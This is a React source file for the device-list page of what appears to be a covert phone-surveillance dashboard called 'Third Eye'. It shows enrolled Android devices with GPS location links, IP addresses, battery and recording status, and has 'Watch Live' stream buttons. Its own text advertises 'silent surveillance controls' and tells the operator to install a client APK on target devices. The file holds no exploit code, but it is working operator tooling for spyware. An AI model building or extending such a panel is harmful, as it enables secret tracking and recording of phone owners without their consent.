import React, { useState, useEffect } from 'react';
import {
  Smartphone,
  Radio,
  Trash2,
  MapPin,
  BatteryCharging,
  BatteryLow,
  Search,
  Check,
  Copy,
  X,
} from 'lucide-react';
import { useDashboard } from '../context/DashboardContext';

import Box from '@mui/material/Box';
import Card from '@mui/material/Card';
import Typography from '@mui/material/Typography';
import TextField from '@mui/material/TextField';
import InputAdornment from '@mui/material/InputAdornment';
import Button from '@mui/material/Button';
import IconButton from '@mui/material/IconButton';
import Chip from '@mui/material/Chip';
import Table from '@mui/material/Table';
import TableBody from '@mui/material/TableBody';
import TableCell from '@mui/material/TableCell';
import TableContainer from '@mui/material/TableContainer';
import TableHead from '@mui/material/TableHead';
import TableRow from '@mui/material/TableRow';
import Pagination from '@mui/material/Pagination';
import Divider from '@mui/material/Divider';

export default function Devices() {
  const {
    devices,
    onlineSocketDevices,
    searchQuery,
    setSearchQuery,
    handleStartLiveStream,
    handleDeleteDevice,
    formatTimeAgo,
  } = useDashboard();

  const [statusFilter, setStatusFilter] = useState('ALL'); // ALL, ONLINE, RECORDING, OFFLINE
  const [devicePage, setDevicePage] = useState(1);
  const [copiedId, setCopiedId] = useState(null);
  const devicesPerPage = 8;

  const copyToClipboard = (text) => {
    navigator.clipboard.writeText(text);
    setCopiedId(text);
    setTimeout(() => setCopiedId(null), 2000);
  };

  // Filter devices by search query and status filter
  const filteredDevices = devices.filter((d) => {
    const matchesSearch =
      (d.deviceName || '').toLowerCase().includes(searchQuery.toLowerCase()) ||
      (d.model || '').toLowerCase().includes(searchQuery.toLowerCase()) ||
      (d.deviceId || '').toLowerCase().includes(searchQuery.toLowerCase());

    const isOnline =
      onlineSocketDevices.has(d.deviceId) ||
      (d.lastSeen && (new Date() - new Date(d.lastSeen)) / 1000 < 60);

    if (!matchesSearch) return false;

    if (statusFilter === 'ONLINE') return isOnline;
    if (statusFilter === 'RECORDING') return d.isRecording;
    if (statusFilter === 'OFFLINE') return !isOnline;
    return true;
  });

  const totalDevicePages = Math.ceil(filteredDevices.length / devicesPerPage) || 1;
  const paginatedDevices = filteredDevices.slice(
    (devicePage - 1) * devicesPerPage,
    devicePage * devicesPerPage
  );

  useEffect(() => {
    setDevicePage(1);
  }, [searchQuery, statusFilter]);

  // Status counts for quick filters
  const onlineCount = devices.filter(
    (d) =>
      onlineSocketDevices.has(d.deviceId) ||
      (d.lastSeen && (new Date() - new Date(d.lastSeen)) / 1000 < 60)
  ).length;

  const recordingCount = devices.filter((d) => d.isRecording).length;

  return (
    <Box sx={{ maxWidth: 1280, mx: 'auto', display: 'flex', flexDirection: 'column', gap: 3 }}>
      {/* Page Header */}
      <Box sx={{ display: 'flex', flexDirection: { xs: 'column', sm: 'row' }, alignItems: { xs: 'stretch', sm: 'center' }, justifyContent: 'space-between', gap: 2 }}>
        <Box>
          <Box sx={{ display: 'flex', alignItems: 'center', gap: 1.5, flexWrap: 'wrap' }}>
            <Smartphone size={22} color="#00e5ff" />
            <Typography variant="h5" sx={{ fontWeight: 700, color: '#fff' }}>
              Connected Devices Fleet
            </Typography>
            <Chip
              size="small"
              label={`${devices.length} Units`}
              sx={{
                background: 'rgba(0,229,255,0.12)',
                border: '1px solid rgba(0,229,255,0.3)',
                color: '#00e5ff',
                fontWeight: 700,
              }}
            />
          </Box>
          <Typography variant="caption" sx={{ color: 'text.secondary', display: 'block', mt: 0.3 }}>
            Real-time telemetry, battery health, and silent surveillance controls
          </Typography>
        </Box>

        {/* Search Bar */}
        <TextField
          size="small"
          placeholder="Search device, model, ID..."
          value={searchQuery}
          onChange={(e) => setSearchQuery(e.target.value)}
          slotProps={{
            input: {
              startAdornment: (
                <InputAdornment position="start">
                  <Search size={16} color="#64748b" />
                </InputAdornment>
              ),
              endAdornment: searchQuery ? (
                <InputAdornment position="end">
                  <IconButton size="small" onClick={() => setSearchQuery('')} sx={{ color: '#64748b' }}>
                    <X size={14} />
                  </IconButton>
                </InputAdornment>
              ) : null,
            },
          }}
          sx={{ width: { xs: '100%', sm: 300 } }}
        />
      </Box>

      {/* Quick Filter Bar */}
      <Box sx={{ display: 'flex', flexWrap: 'wrap', gap: 1 }}>
        <Button
          size="small"
          variant={statusFilter === 'ALL' ? 'contained' : 'outlined'}
          onClick={() => setStatusFilter('ALL')}
          sx={{
            background: statusFilter === 'ALL' ? 'rgba(0,229,255,0.18)' : 'transparent',
            borderColor: statusFilter === 'ALL' ? 'rgba(0,229,255,0.4)' : 'rgba(255,255,255,0.1)',
            color: statusFilter === 'ALL' ? '#00e5ff' : 'text.secondary',
            boxShadow: statusFilter === 'ALL' ? '0 0 12px rgba(0,229,255,0.2)' : 'none',
          }}
        >
          All Devices ({devices.length})
        </Button>

        <Button
          size="small"
          variant={statusFilter === 'ONLINE' ? 'contained' : 'outlined'}
          onClick={() => setStatusFilter('ONLINE')}
          startIcon={<Box sx={{ width: 8, height: 8, borderRadius: '50%', background: '#00e676', animation: 'radar-dot-pulse 2s infinite' }} />}
          sx={{
            background: statusFilter === 'ONLINE' ? 'rgba(0,230,118,0.18)' : 'transparent',
            borderColor: statusFilter === 'ONLINE' ? 'rgba(0,230,118,0.4)' : 'rgba(255,255,255,0.1)',
            color: statusFilter === 'ONLINE' ? '#00e676' : 'text.secondary',
            boxShadow: statusFilter === 'ONLINE' ? '0 0 12px rgba(0,230,118,0.2)' : 'none',
          }}
        >
          Online ({onlineCount})
        </Button>

        <Button
          size="small"
          variant={statusFilter === 'RECORDING' ? 'contained' : 'outlined'}
          onClick={() => setStatusFilter('RECORDING')}
          startIcon={<Box sx={{ width: 8, height: 8, borderRadius: '50%', background: '#ff1744' }} />}
          sx={{
            background: statusFilter === 'RECORDING' ? 'rgba(255,23,68,0.18)' : 'transparent',
            borderColor: statusFilter === 'RECORDING' ? 'rgba(255,23,68,0.4)' : 'rgba(255,255,255,0.1)',
            color: statusFilter === 'RECORDING' ? '#ff5252' : 'text.secondary',
            boxShadow: statusFilter === 'RECORDING' ? '0 0 12px rgba(255,23,68,0.2)' : 'none',
          }}
        >
          Recording ({recordingCount})
        </Button>

        <Button
          size="small"
          variant={statusFilter === 'OFFLINE' ? 'contained' : 'outlined'}
          onClick={() => setStatusFilter('OFFLINE')}
          sx={{
            background: statusFilter === 'OFFLINE' ? 'rgba(255,255,255,0.12)' : 'transparent',
            borderColor: statusFilter === 'OFFLINE' ? 'rgba(255,255,255,0.25)' : 'rgba(255,255,255,0.1)',
            color: statusFilter === 'OFFLINE' ? '#fff' : 'text.secondary',
          }}
        >
          Offline ({devices.length - onlineCount})
        </Button>
      </Box>

      {/* Main Content: Table / Cards */}
      {filteredDevices.length === 0 ? (
        <Card sx={{ p: 6, textAlign: 'center', background: 'rgba(16,23,38,0.6)' }}>
          <Smartphone size={36} color="#64748b" style={{ margin: '0 auto 12px' }} />
          <Typography variant="subtitle1" sx={{ fontWeight: 600, color: '#fff' }}>
            No matching devices found
          </Typography>
          <Typography variant="body2" sx={{ color: 'text.secondary', mt: 0.5, maxWidth: 380, mx: 'auto' }}>
            {searchQuery || statusFilter !== 'ALL'
              ? 'Try adjusting your search terms or filter selection.'
              : 'Install the Third Eye client APK on devices to begin monitoring.'}
          </Typography>
          {(searchQuery || statusFilter !== 'ALL') && (
            <Button
              size="small"
              variant="outlined"
              onClick={() => {
                setSearchQuery('');
                setStatusFilter('ALL');
              }}
              sx={{ mt: 2, color: '#00e5ff', borderColor: 'rgba(0,229,255,0.3)' }}
            >
              Reset Filters
            </Button>
          )}
        </Card>
      ) : (
        <Card sx={{ overflow: 'hidden' }}>
          {/* ===== MOBILE CARD LAYOUT (< 600px) ===== */}
          <Box sx={{ display: { xs: 'flex', sm: 'none' }, flexDirection: 'column' }}>
            {paginatedDevices.map((d, index) => {
              const isOnline =
                onlineSocketDevices.has(d.deviceId) ||
                (d.lastSeen && (new Date() - new Date(d.lastSeen)) / 1000 < 60);

              return (
                <Box key={d.deviceId}>
                  {index > 0 && <Divider sx={{ borderColor: 'rgba(255,255,255,0.05)' }} />}
                  <Box sx={{ p: 2, display: 'flex', flexDirection: 'column', gap: 1.5 }}>
                    {/* Top Row: Device Name & Status */}
                    <Box sx={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 1 }}>
                      <Box sx={{ display: 'flex', alignItems: 'center', gap: 1.5, minWidth: 0 }}>
                        <Box sx={{
                          width: 36, height: 36, borderRadius: '10px',
                          background: 'rgba(0,229,255,0.1)', border: '1px solid rgba(0,229,255,0.25)',
                          display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#00e5ff',
                          flexShrink: 0,
                        }}>
                          <Smartphone size={16} />
                        </Box>
                        <Box sx={{ minWidth: 0 }}>
                          <Typography variant="body2" sx={{ fontWeight: 700, color: '#fff', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                            {d.deviceName || d.model}
                          </Typography>
                          <Typography variant="caption" sx={{ color: '#64748b', fontFamily: 'monospace', display: 'block', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                            {d.model}
                          </Typography>
                        </Box>
                      </Box>
                      <Chip
                        size="small"
                        label={d.isRecording ? 'REC' : isOnline ? 'Online' : 'Offline'}
                        sx={{
                          height: 22,
                          background: d.isRecording ? 'rgba(255,23,68,0.15)' : isOnline ? 'rgba(0,230,118,0.12)' : 'rgba(255,255,255,0.04)',
                          border: d.isRecording ? '1px solid rgba(255,23,68,0.4)' : isOnline ? '1px solid rgba(0,230,118,0.3)' : '1px solid rgba(255,255,255,0.1)',
                          color: d.isRecording ? '#ff5252' : isOnline ? '#00e676' : '#64748b',
                          fontFamily: '"JetBrains Mono", monospace', fontWeight: 600,
                          flexShrink: 0,
                        }}
                      />
                    </Box>

                    {/* Metadata Grid */}
                    <Box sx={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 1, fontSize: '0.75rem' }}>
                      <Box>
                        <Typography variant="caption" sx={{ color: '#64748b', fontFamily: 'monospace', textTransform: 'uppercase', fontSize: '0.65rem', display: 'block' }}>
                          Battery
                        </Typography>
                        <Typography variant="caption" sx={{
                          fontWeight: 700, fontFamily: 'monospace',
                          color: d.batteryLevel > 50 ? '#00e676' : d.batteryLevel > 20 ? '#f59e0b' : '#ff1744',
                        }}>
                          {d.batteryLevel || 0}%
                        </Typography>
                      </Box>

                      <Box>
                        <Typography variant="caption" sx={{ color: '#64748b', fontFamily: 'monospace', textTransform: 'uppercase', fontSize: '0.65rem', display: 'block' }}>
                          Last Seen
                        </Typography>
                        <Typography variant="caption" sx={{ fontFamily: 'monospace', color: isOnline ? '#00e676' : 'text.secondary' }}>
                          {isOnline ? 'Active now' : formatTimeAgo(d.lastSeen)}
                        </Typography>
                      </Box>

                      {d.latitude && d.longitude && (
                        <Box sx={{ gridColumn: 'span 2' }}>
                          <Typography variant="caption" sx={{ color: '#64748b', fontFamily: 'monospace', textTransform: 'uppercase', fontSize: '0.65rem', display: 'block' }}>
                            Location
                          </Typography>
                          <a
                            href={`https://www.google.com/maps?q=${d.latitude},${d.longitude}`}
                            target="_blank"
                            rel="noreferrer"
                            style={{ display: 'inline-flex', alignItems: 'center', gap: 4, color: '#00e5ff', textDecoration: 'none', fontSize: '0.75rem' }}
                          >
                            <MapPin size={11} />
                            <span style={{ overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                              {d.locationName || `${d.latitude.toFixed(3)}, ${d.longitude.toFixed(3)}`}
                            </span>
                          </a>
                        </Box>
                      )}
                    </Box>

                    {/* Action buttons */}
                    <Box sx={{ display: 'flex', alignItems: 'center', gap: 1, pt: 0.5 }}>
                      <Button
                        size="small"
                        variant="contained"
                        fullWidth
                        onClick={() => handleStartLiveStream(d)}
                        startIcon={<Radio size={13} />}
                        sx={{
                          background: 'linear-gradient(135deg, rgba(255,23,68,0.3) 0%, rgba(255,23,68,0.15) 100%)',
                          border: '1px solid rgba(255,23,68,0.4)',
                          color: '#ff5252',
                          '&:hover': { background: 'linear-gradient(135deg, #ff1744 0%, #c4001d 100%)', color: '#fff' },
                        }}
                      >
                        Watch Live
                      </Button>
                      <IconButton
                        size="small"
                        onClick={() => copyToClipboard(d.deviceId)}
                        sx={{ border: '1px solid rgba(255,255,255,0.1)', color: '#94a3b8' }}
                      >
                        {copiedId === d.deviceId ? <Check size={14} color="#00e676" /> : <Copy size={14} />}
                      </IconButton>
                      <IconButton
                        size="small"
                        onClick={() => handleDeleteDevice(d.deviceId)}
                        sx={{ border: '1px solid rgba(255,23,68,0.2)', color: '#ff5252' }}
                      >
                        <Trash2 size={14} />
                      </IconButton>
                    </Box>
                  </Box>
                </Box>
              );
            })}
          </Box>

          {/* ===== DESKTOP TABLE LAYOUT (>= 600px) ===== */}
          <Box sx={{ display: { xs: 'none', sm: 'block' } }}>
            <TableContainer>
              <Table size="small" sx={{ minWidth: 700 }}>
                <TableHead>
                  <TableRow>
                    <TableCell>Device Unit / Model</TableCell>
                    <TableCell>Device ID</TableCell>
                    <TableCell>Telemetry Location</TableCell>
                    <TableCell>Battery</TableCell>
                    <TableCell>Resolution</TableCell>
                    <TableCell>Status</TableCell>
                    <TableCell>Last Seen</TableCell>
                    <TableCell align="center">Recordings</TableCell>
                    <TableCell align="right">Surveillance Actions</TableCell>
                  </TableRow>
                </TableHead>
                <TableBody>
                  {paginatedDevices.map((d) => {
                    const isOnline =
                      onlineSocketDevices.has(d.deviceId) ||
                      (d.lastSeen && (new Date() - new Date(d.lastSeen)) / 1000 < 60);

                    return (
                      <TableRow key={d.deviceId} hover>
                        {/* Device Info */}
                        <TableCell>
                          <Box sx={{ display: 'flex', alignItems: 'center', gap: 1.5 }}>
                            <Box sx={{
                              width: 36, height: 36, borderRadius: '10px',
                              background: 'rgba(0,229,255,0.1)', border: '1px solid rgba(0,229,255,0.25)',
                              display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#00e5ff',
                              flexShrink: 0,
                            }}>
                              <Smartphone size={17} />
                            </Box>
                            <Box>
                              <Typography variant="body2" sx={{ fontWeight: 700, color: '#fff', '&:hover': { color: '#00e5ff' } }}>
                                {d.deviceName || d.model}
                              </Typography>
                              <Typography variant="caption" sx={{ color: 'text.secondary', fontFamily: 'monospace', display: 'block' }}>
                                {d.model} {d.androidVersion ? `(v${d.androidVersion})` : ''}
                              </Typography>
                            </Box>
                          </Box>
                        </TableCell>

                        {/* Device ID */}
                        <TableCell>
                          <Button
                            size="small"
                            onClick={() => copyToClipboard(d.deviceId)}
                            endIcon={copiedId === d.deviceId ? <Check size={12} color="#00e676" /> : <Copy size={12} />}
                            sx={{
                              fontFamily: '"JetBrains Mono", monospace', fontSize: '0.75rem',
                              color: '#cbd5e1', background: 'rgba(0,0,0,0.4)',
                              border: '1px solid rgba(255,255,255,0.1)', px: 1, py: 0.2, minWidth: 0,
                              '&:hover': { borderColor: 'rgba(0,229,255,0.4)', color: '#fff' },
                            }}
                          >
                            {d.deviceId.length > 14 ? `${d.deviceId.substring(0, 14)}...` : d.deviceId}
                          </Button>
                        </TableCell>

                        {/* Location */}
                        <TableCell>
                          {d.latitude && d.longitude ? (
                            <Button
                              size="small"
                              component="a"
                              href={`https://www.google.com/maps?q=${d.latitude},${d.longitude}`}
                              target="_blank"
                              rel="noreferrer"
                              startIcon={<MapPin size={12} />}
                              sx={{
                                fontSize: '0.75rem', py: 0.2, px: 1,
                                background: 'rgba(0,229,255,0.08)', border: '1px solid rgba(0,229,255,0.25)',
                                color: '#00e5ff', minWidth: 0,
                                '&:hover': { background: 'rgba(0,229,255,0.18)' },
                              }}
                            >
                              <span style={{ maxWidth: 120, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                                {d.locationName || `${d.latitude.toFixed(2)}, ${d.longitude.toFixed(2)}`}
                              </span>
                            </Button>
                          ) : (
                            <Typography variant="caption" sx={{ color: '#64748b', fontFamily: 'monospace' }}>
                              {d.ipAddress ? d.ipAddress.split(',')[0] : 'GPS Standby'}
                            </Typography>
                          )}
                        </TableCell>

                        {/* Battery */}
                        <TableCell>
                          <Chip
                            size="small"
                            icon={d.batteryLevel > 50 ? <BatteryCharging size={13} /> : <BatteryLow size={13} />}
                            label={`${d.batteryLevel || 0}%`}
                            sx={{
                              height: 24,
                              background: d.batteryLevel > 50 ? 'rgba(0,230,118,0.12)' : d.batteryLevel > 20 ? 'rgba(245,158,11,0.12)' : 'rgba(255,23,68,0.12)',
                              border: d.batteryLevel > 50 ? '1px solid rgba(0,230,118,0.3)' : d.batteryLevel > 20 ? '1px solid rgba(245,158,11,0.3)' : '1px solid rgba(255,23,68,0.3)',
                              color: d.batteryLevel > 50 ? '#00e676' : d.batteryLevel > 20 ? '#f59e0b' : '#ff1744',
                              fontFamily: '"JetBrains Mono", monospace', fontWeight: 700,
                              '& .MuiChip-icon': { color: 'inherit' },
                            }}
                          />
                        </TableCell>

                        {/* Resolution */}
                        <TableCell>
                          <Typography variant="caption" sx={{
                            px: 1, py: 0.4, borderRadius: 1,
                            background: 'rgba(0,0,0,0.4)', border: '1px solid rgba(255,255,255,0.08)',
                            fontFamily: '"JetBrains Mono", monospace', color: '#cbd5e1',
                          }}>
                            {d.videoQuality || '720p'}
                          </Typography>
                        </TableCell>

                        {/* Status */}
                        <TableCell>
                          <Chip
                            size="small"
                            label={d.isRecording ? 'Recording' : isOnline ? 'Online' : 'Offline'}
                            sx={{
                              height: 24,
                              background: d.isRecording ? 'rgba(255,23,68,0.15)' : isOnline ? 'rgba(0,230,118,0.12)' : 'rgba(255,255,255,0.04)',
                              border: d.isRecording ? '1px solid rgba(255,23,68,0.4)' : isOnline ? '1px solid rgba(0,230,118,0.3)' : '1px solid rgba(255,255,255,0.1)',
                              color: d.isRecording ? '#ff5252' : isOnline ? '#00e676' : '#64748b',
                              fontFamily: '"JetBrains Mono", monospace', fontWeight: 600,
                            }}
                          />
                        </TableCell>

                        {/* Last Seen */}
                        <TableCell>
                          <Typography variant="caption" sx={{
                            fontFamily: '"JetBrains Mono", monospace',
                            color: isOnline ? '#00e676' : '#64748b',
                            fontWeight: isOnline ? 600 : 400,
                          }}>
                            {isOnline ? 'Active now' : formatTimeAgo(d.lastSeen)}
                          </Typography>
                        </TableCell>

                        {/* Recordings Count */}
                        <TableCell align="center">
                          <Typography variant="caption" sx={{
                            fontWeight: 700, color: '#fff', fontFamily: 'monospace',
                            background: 'rgba(255,255,255,0.04)', px: 1.5, py: 0.5, borderRadius: 1,
                            border: '1px solid rgba(255,255,255,0.06)',
                          }}>
                            {d.totalRecordings || 0}
                          </Typography>
                        </TableCell>

                        {/* Surveillance Actions */}
                        <TableCell align="right">
                          <Box sx={{ display: 'inline-flex', alignItems: 'center', gap: 1 }}>
                            <Button
                              size="small"
                              variant="contained"
                              onClick={() => handleStartLiveStream(d)}
                              startIcon={<Radio size={13} />}
                              sx={{
                                fontSize: '0.75rem', py: 0.5, px: 1.5,
                                background: 'linear-gradient(135deg, rgba(255,23,68,0.3) 0%, rgba(255,23,68,0.15) 100%)',
                                border: '1px solid rgba(255,23,68,0.4)',
                                color: '#ff5252',
                                boxShadow: '0 0 10px rgba(255,23,68,0.2)',
                                '&:hover': {
                                  background: 'linear-gradient(135deg, #ff1744 0%, #c4001d 100%)',
                                  color: '#fff',
                                  boxShadow: '0 0 16px rgba(255,23,68,0.4)',
                                },
                              }}
                            >
                              Watch Live
                            </Button>
                            <IconButton
                              size="small"
                              onClick={() => handleDeleteDevice(d.deviceId)}
                              title="Unlink & remove device"
                              sx={{
                                color: '#64748b',
                                '&:hover': { color: '#ff5252', background: 'rgba(255,23,68,0.1)' },
                              }}
                            >
                              <Trash2 size={14} />
                            </IconButton>
                          </Box>
                        </TableCell>
                      </TableRow>
                    );
                  })}
                </TableBody>
              </Table>
            </TableContainer>
          </Box>

          {/* Pagination Controls */}
          {filteredDevices.length > devicesPerPage && (
            <Box sx={{
              display: 'flex', flexDirection: { xs: 'column', sm: 'row' },
              alignItems: 'center', justifyContent: 'space-between',
              gap: 2, p: 2,
              background: 'rgba(8,13,22,0.9)',
              borderTop: '1px solid rgba(255,255,255,0.06)',
            }}>
              <Typography variant="caption" sx={{ color: 'text.secondary', fontFamily: 'monospace' }}>
                Showing {(devicePage - 1) * devicesPerPage + 1} -{' '}
                {Math.min(devicePage * devicesPerPage, filteredDevices.length)} of {filteredDevices.length} devices
              </Typography>
              <Pagination
                count={totalDevicePages}
                page={devicePage}
                onChange={(_, page) => setDevicePage(page)}
                size="small"
                showFirstButton
                showLastButton
              />
            </Box>
          )}
        </Card>
      )}
    </Box>
  );
}
